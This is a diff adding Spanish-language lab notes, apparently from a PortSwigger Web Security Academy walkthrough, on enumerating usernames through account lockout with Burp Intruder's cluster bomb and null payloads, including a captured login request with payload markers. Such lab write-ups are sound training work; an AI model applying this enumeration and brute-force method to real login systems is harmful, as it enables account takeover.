@@ -198,4 +198,70 @@ Y como vimos cuando el usuario es correcto nos regresa un codigo 302 y cuando no
 password del usuario carlos.
 
 
+# Username enumeration via account lock 
+
+Para este laboratorio tenemos que enumerar por medio de un cambio en la respuesta cuando se bloquea el usuario
+
+## Cluster Bomb 
+
+Este ataque prueba las convinaciones de todos los user names de una lista con cada uno del los passwords ejemplo
+
+```
+User1:Password1
+User1:Password2
+User1:Password3
+User2:Password1
+User2:Password2
+User2:Password3
+User3:Password1
+User3:Password2
+User3:Password3
+```
+Osea que si tenemos 2 listas users.txt y passwords.txt probara cada password para cada usuario
+
+Siguiendo con el lab usamos este ataque pero diferente ***Payload Nulla**
+
+```
+POST /login HTTP/1.1
+Host: 0af5002c047ae61bc005b40e00f10008.web-security-academy.net
+Cookie: session=neX3S8v3XIbS3Jnq4Inab4bpNQph95tu
+Content-Length: 36
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0af5002c047ae61bc005b40e00f10008.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af5002c047ae61bc005b40e00f10008.web-security-academy.net/login
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+username=§ak§&password=123456§§
+
+```
+Para esta variante del ataque se pone asi al ultimos los simbolos si no no funciona
+Para la payload se usa la null y se le pone general 5 null payload y lo que haria seria lo siguiente
+
+```
+ak:123456
+ak:123456
+ak:123456
+ak:123456
+ak:123456
+otrouser:123456
+otrouser:123456
+otrouser:123456
+otrouser:123456
+otrouser:123456
+```
+Osea que genera 5 payloads de cada usuario y agrega un null al ultimo lo que genera que se bloquee la cuenta con un mensaje de "Hiciste demaciados intentos"
+Finalmente teniengo el user pues ya solo usas el sniper atack
 
